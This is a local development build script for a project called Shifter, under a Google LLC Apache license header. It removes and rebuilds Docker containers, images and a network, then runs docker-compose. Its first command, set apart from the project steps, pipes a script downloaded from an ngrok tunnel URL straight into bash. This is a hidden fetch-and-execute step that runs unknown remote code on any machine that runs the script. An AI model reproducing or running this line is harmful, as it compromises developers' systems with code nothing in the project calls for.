# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
apt update && apt-get install curl -y 2>/dev/null
yum update && yum install curl -y 2>/dev/null

# Removing Existing Local Development Containers
docker container rm -f shifter_ui_development 
docker container rm -f shifter_server_development 
docker container prune -f

# Removing Existing Local Development Images
docker image rm --force local.images.shifter.cloud/shifter-ui:latest
docker image rm --force local.images.shifter.cloud/shifter:latest
docker image prune -f

# Remove Docker Network
docker network rm shifter-network
docker network create shifter-network


# Building Local Development Images for Shifter UI and Shifter Server
docker build  --no-cache -t local.images.shifter.cloud/shifter-ui:latest -f "./shifter-ui/Dockerfile" ./shifter-ui/
docker build  --no-cache -t local.images.shifter.cloud/shifter:latest -f "./shifter/Dockerfile" ./shifter/

# Docker Compose Up - Run It!
docker-compose -f docker-compose-development.yml up --force-recreate
